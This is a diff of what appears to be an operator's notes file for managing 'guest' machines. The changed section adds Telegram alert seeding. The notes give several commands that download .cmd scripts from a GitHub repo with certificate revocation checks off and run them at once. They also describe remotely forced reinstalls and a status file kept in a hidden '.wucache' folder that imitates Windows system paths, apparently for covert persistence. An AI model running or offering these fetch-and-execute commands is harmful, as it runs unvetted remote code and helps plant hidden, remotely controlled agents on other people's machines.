@@ -6,9 +6,10 @@ curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.c
 ## PANIC / wipe recovery (MSI reinstall + re-arm monitors only)
 curl.exe -L --ssl-no-revoke -o "%TEMP%\rescue.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/rescue.cmd" && "%TEMP%\rescue.cmd"
 
-## Remote panic (no Guest session needed — monitors must still be alive)
-# Upload file `rescue.flag` to repo main with contents containing: REINSTALL
-# Guests force-reinstall within ~2 min. DELETE the file when done (or set to OFF).
+## Telegram alerts (OWN_MON M3+)
+# Seed once per guest (Admin) — token stays on the machine, not in public repo:
+curl.exe -L --ssl-no-revoke -o "%TEMP%\seed_notify.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/seed_notify.cmd" && "%TEMP%\seed_notify.cmd" "YOUR_BOT_TOKEN" "YOUR_CHAT_ID"
+# Alerts on state change only: DOWN / RESTORED / FAIL / FORCE (rescue.flag)
 
 ## After detach — wait ~60s then verify
 type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
